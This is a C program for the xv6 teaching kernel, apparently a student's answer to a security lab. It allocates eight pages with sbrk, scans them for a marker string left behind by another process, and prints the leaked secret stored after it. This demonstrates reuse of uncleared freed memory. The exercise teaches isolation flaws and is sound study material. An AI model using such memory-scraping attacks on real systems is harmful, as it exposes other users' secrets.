#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define DATASIZE (8 * PGSIZE)

// 检查字符是不是数字或英文字母。
static int
is_alnum(char c)
{
  return (c >= '0' && c <= '9') ||
         (c >= 'A' && c <= 'Z') ||
         (c >= 'a' && c <= 'z');
}

// 判断 p 开始的内容是否与 pattern 相同。
static int
matches(char *p, char *pattern)
{
  int i;

  for(i = 0; pattern[i] != '\0'; i++){
    if(p[i] != pattern[i])
      return 0;
  }

  return 1;
}

int
main(int argc, char *argv[])
{
  // Your code here.
  char *memory;
  char *secret;
  char marker[] = "This may help.";
  int i;
  int len;

  if(argc != 1){
    fprintf(2, "usage: attack\n");
    exit(1);
  }

  // 申请8页内存，尝试重新获得secret释放的物理页。
  memory = sbrk(DATASIZE);

  if(memory == (char *)-1){
    fprintf(2, "attack: sbrk failed\n");
    exit(1);
  }

  // 扫描申请到的全部内存。
  for(i = 0; i + 16 < DATASIZE; i++){
    if(!matches(memory + i, marker))
      continue;

    // secret.c 把秘密放在标记起始位置之后16字节处。
    secret = memory + i + 16;

    // 检查它是否确实是字母数字字符串。
    len = 0;
    while(i + 16 + len < DATASIZE &&
          is_alnum(secret[len])){
      len++;
    }

    // 必须非空，并且最后有字符串结束符。
    if(len > 0 &&
       i + 16 + len < DATASIZE &&
       secret[len] == '\0'){
      printf("%s\n", secret);
      exit(0);
    }
  }

  // 这次没重新拿到目标页；题目允许第二次运行。
  exit(1);
}
